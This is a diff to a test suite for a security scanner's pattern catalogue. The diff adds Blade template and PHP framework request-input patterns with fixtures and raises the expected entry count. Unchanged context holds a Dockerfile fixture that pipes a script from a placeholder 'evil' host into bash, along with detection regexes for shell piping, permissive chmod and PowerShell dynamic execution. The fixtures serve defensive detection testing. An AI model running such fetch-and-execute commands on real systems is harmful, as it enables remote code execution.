@@ -4,9 +4,10 @@ extra entry points.
 Covers the four tables in `assess.lib.treesitter_index` that this suite
 owns: `_STREAM_SOURCE_PATTERNS`, `_STREAM_IMPORT_PATTERNS`,
 `_STREAM_EXTRA_SINK_PATTERNS` and `_STREAM_EXTRA_ENTRY_PATTERNS`. As of this
-audit these hold 74 entries across 16 languages (up from the 60/15 in the
+audit these hold 83 entries across 17 languages (up from the 60/15 in the
 original assignment brief -- a `powershell` language landed mid-audit via a
-concurrent edit to the very same tables; see the module note below). Every
+concurrent edit to the very same tables, and `blade` plus php's framework
+request accessors landed the same way after it; see the module note below). Every
 pattern is classified LIVE / DEAD / REDUNDANT / OBSOLETE / MISROUTED by
 executing the real indexer/scanner against idiomatic 2026 fixtures; only
 LIVE patterns get a positive test (see the OBSOLETE allow-list on the
@@ -22,8 +23,8 @@ Mechanics this suite leans on (verified against the source, not assumed):
 * `_STREAM_IMPORT_PATTERNS` / `_STREAM_EXTRA_SINK_PATTERNS` /
   `_STREAM_EXTRA_ENTRY_PATTERNS` fire only when the whole artifact is
   produced by `streaming_security_fallback` (directly, or via a degraded
-  `index_file`). For the seven lightweight languages (dockerfile, shell,
-  powershell, lua, html, css, freemarker) the NORMAL route is
+  `index_file`). For the eight lightweight languages (blade, dockerfile,
+  shell, powershell, lua, html, css, freemarker) the NORMAL route is
   `_index_lightweight`'s own hand-written extractor -- these three tables
   are reachable only through a genuine degradation, which a real 2026
   target hits via `parser_boundary.py`'s `giant_line_resource_limit` /
@@ -172,6 +173,16 @@ function handle() {
     $s = $_SERVER['REMOTE_ADDR'];
     $e = getenv('HOME');
 }
+
+function handleFramework(Request $request) {
+    $page = $request->input('page');
+    $legacy = Input::get('legacy');
+}
+"""
+
+BLADE_SOURCES_SRC = """\
+<p>{{ $user->name }}</p>
+<p>{!! $user->bio !!}</p>
 """
 
 C_SOURCES_SRC = """\
@@ -250,6 +261,10 @@ FREEMARKER_IMPORT_SRC = (
     '<#include "common.ftl">\n<#import "layout.ftl" as l>\n<script src="a.js"></script>\n'
 )
 PS_IMPORT_SRC = "Import-Module PSReadLine\n. .\\lib\\helpers.psm1\n"
+BLADE_IMPORT_SRC = (
+    "@extends('layouts.app')\n@include('partials.header')\n"
+    '<script src="app.js"></script>\n'
+)
 
 DOCKERFILE_SINK_SRC = (
     "FROM alpine\nRUN curl https://evil.example.com/x.sh | bash\nRUN chmod -R 0777 /app\n"
@@ -273,6 +288,12 @@ function Do-Things {
     [x]::ServerCertificateValidationCallback = {$true}
 }
 """
+
+BLADE_SINK_SRC = (
+    "<p>{{ $name }}</p>\n<p>{!! $bio !!}</p>\n"
+    '<button onclick="go()">Go</button>\n'
+)
+BLADE_ENTRY_SRC = '<form action="/tags/save" method="post"></form>\n'
 
 SHELL_ENTRY_SRC = "#!/bin/bash\necho hi\n"
 DOCKERFILE_ENTRY_SRC = 'FROM alpine\nCMD ["run"]\nENTRYPOINT ["/bin/app"]\n'
@@ -310,7 +331,10 @@ LIVE_CASES: list[tuple[str, str, str, str, str, str, str, str]] = [
     ("source", "ruby", r"\b(?:params\s*\[|request\.)", "source", RUBY_SOURCES_SRC, "app.rb", "id = params[:id]", "http_request_input"),
     ("source", "ruby", r"\b(?:ENV\s*\[|ARGV\b)", "source", RUBY_SOURCES_SRC, "app.rb", "e = ENV['HOME']", "process_input"),
     ("source", "php", r"\$_(?:GET|POST|REQUEST|COOKIE|FILES|SERVER)\b", "source", PHP_SOURCES_SRC, "index.php", "$id = $_GET['id'];", "http_request_input"),
+    ("source", "php", r"(?:\$request|\$req|\$this->(?:request|input)|\brequest\s*\(\s*\))\s*->", "source", PHP_SOURCES_SRC, "index.php", "$page = $request->input('page');", "http_request_input"),
+    ("source", "php", r"\b(?:Input|Request)::(?:input|get|all|query|post|json|file|header|cookie)\s*\(", "source", PHP_SOURCES_SRC, "index.php", "$legacy = Input::get('legacy');", "http_request_input"),
     ("source", "php", r"\bgetenv\s*\(", "source", PHP_SOURCES_SRC, "index.php", "$e = getenv('HOME');", "process_input"),
+    ("source", "blade", r"\{\{(?!--)[^}\r\n]+\}\}|\{!![^!\r\n]+!!\}", "source", BLADE_SOURCES_SRC, "profile.blade.php", "{{ $user->name }}", "template_input"),
     ("source", "c", r"\b(?:argv\s*\[|getenv\s*\(|read\s*\(|recv\s*\()", "source", C_SOURCES_SRC, "main.c", 'char *a = argv[1];', "process_input"),
     ("source", "cpp", r"\b(?:argv\s*\[|getenv\s*\(|read\s*\(|recv\s*\()", "source", CPP_SOURCES_SRC, "main.cpp", 'char *a = argv[1];', "process_input"),
     ("source", "shell", r"\$(?:[1-9]|@|\*)\b", "source", SHELL_SOURCES_SRC, "install.sh", "echo $1", "positional_parameter"),
@@ -344,6 +368,8 @@ LIVE_CASES: list[tuple[str, str, str, str, str, str, str, str]] = [
     ("import", "freemarker", r"<(?:script|link|iframe)\b[^>]*(?:src|href)\s*=\s*['\"]?[^'\"\s>]+", "import", FREEMARKER_IMPORT_SRC, "x.ftl", '<script src="a.js">', None),
     ("import", "powershell", r"^\s*(?:Import-Module|using\s+(?:module|namespace))\s+[^\r\n]+", "import", PS_IMPORT_SRC, "mod.ps1", "Import-Module PSReadLine", None),
     ("import", "powershell", r"^\s*\.\s+[^\s\r\n]+\.psm?1", "import", PS_IMPORT_SRC, "mod.ps1", "helpers.psm1", None),
+    ("import", "blade", r"@(?:extends|include(?:First|Unless|When|If)?|component|each)\s*\([^\r\n)]*", "import", BLADE_IMPORT_SRC, "x.blade.php", "@extends('layouts.app')", None),
+    ("import", "blade", r"<(?:script|link|iframe)\b[^>]*(?:src|href)\s*=\s*['\"]?[^'\"\s>]+", "import", BLADE_IMPORT_SRC, "x.blade.php", '<script src="app.js">', None),
     # ========================== extra sinks =================================
     ("extra_sink", "dockerfile", r"\b(?:curl|wget)\b[^\r\n|;]*\|\s*(?:sh|bash|zsh)\b", "extra_sink", DOCKERFILE_SINK_SRC, "Dockerfile", "RUN curl https://evil.example.com/x.sh | bash", "remote_pipe_to_shell"),
     ("extra_sink", "dockerfile", r"\bchmod\s+(?:-R\s+)?[0-7]*777\b", "extra_sink", DOCKERFILE_SINK_SRC, "Dockerfile", "RUN chmod -R 0777 /app", "permissive_chmod"),
@@ -357,6 +383,9 @@ LIVE_CASES: list[tuple[str, str, str, str, str, str, str, str]] = [
     ("extra_sink", "freemarker", r"[$#]\{[^}\r\n]+\}", "extra_sink", FREEMARKER_SINK_SRC, "x.ftl", "<p>${value}</p>", "template_interpolation"),
     ("extra_sink", "freemarker", r"\bon[a-z]+\s*=\s*['\"][^'\"]+['\"]", "extra_sink", FREEMARKER_SINK_SRC, "x.ftl", "onclick=", "inline_event_handler"),
     ("extra_sink", "freemarker", r"\?(?:eval|eval_json|evalJson|interpret|new)\b", "extra_sink", FREEMARKER_SINK_SRC, "x.ftl", "${data?eval}", "freemarker_dynamic_evaluation"),
+    ("extra_sink", "blade", r"\{!![^!\r\n]+!!\}", "extra_sink", BLADE_SINK_SRC, "x.blade.php", "{!! $bio !!}", "unescaped_output"),
+    ("extra_sink", "blade", r"\{\{(?!--)[^}\r\n]+\}\}", "extra_sink", BLADE_SINK_SRC, "x.blade.php", "{{ $name }}", "template_interpolation"),
+    ("extra_sink", "blade", r"\bon[a-z]+\s*=\s*['\"][^'\"]+['\"]", "extra_sink", BLADE_SINK_SRC, "x.blade.php", 'onclick="go()"', "inline_event_handler"),
     # powershell's 8 -- dual-path, tested via plain index_file (route="ps_sink")
     ("extra_sink", "powershell", r"\b(?:Invoke-Expression|iex)\b|\[scriptblock\]::Create\s*\(|\bAdd-Type\b", "ps_sink", PS_SINK_SRC, "sinks.ps1", "Invoke-Expression $cmd", "dynamic_code_evaluation"),
     ("extra_sink", "powershell", r"\b(?:Start-Process|Invoke-Item|Invoke-Command|Start-Job)\b", "ps_sink", PS_SINK_SRC, "sinks.ps1", "Start-Process notepad.exe", "process_exec"),
@@ -378,6 +407,7 @@ LIVE_CASES: list[tuple[str, str, str, str, str, str, str, str]] = [
     ("extra_entry", "freemarker", r"<form\b[^>]*\baction\s*=", "extra_entry", FREEMARKER_ENTRY_SRC, "x.ftl", '<form action="/submit">', "html_form"),
     ("extra_entry", "freemarker", r"<#(?:macro|function)\s", "extra_entry", FREEMARKER_ENTRY_SRC, "x.ftl", "<#macro alert kind>", "freemarker_macro"),
     ("extra_entry", "powershell", r"^\s*param\s*\(", "extra_entry", PS_ENTRY_SRC, "mod2.ps1", "param(", "script_parameters"),
+    ("extra_entry", "blade", r"<form\b[^>]*\baction\s*=", "extra_entry", BLADE_ENTRY_SRC, "x.blade.php", '<form action="/tags/save"', "html_form"),
 ]
 
 
@@ -605,10 +635,10 @@ def test_catalogue_sweep_covers_every_streaming_pattern() -> None:
         | _real_extra_sink_keys()
         | _real_extra_entry_keys()
     )
-    assert len(real_keys) == 74, (
-        f"expected 74 streaming catalogue entries (26 sources + 20 imports + "
-        f"21 extra sinks + 7 extra entry points -- includes the powershell "
-        f"language added mid-audit), found {len(real_keys)}. The catalogue "
+    assert len(real_keys) == 83, (
+        f"expected 83 streaming catalogue entries (29 sources + 22 imports + "
+        f"24 extra sinks + 8 extra entry points -- includes the powershell and "
+        f"blade languages added mid-audit), found {len(real_keys)}. The catalogue "
         f"has drifted since this audit; update LIVE_CASES/OBSOLETE_PATTERNS."
     )
 
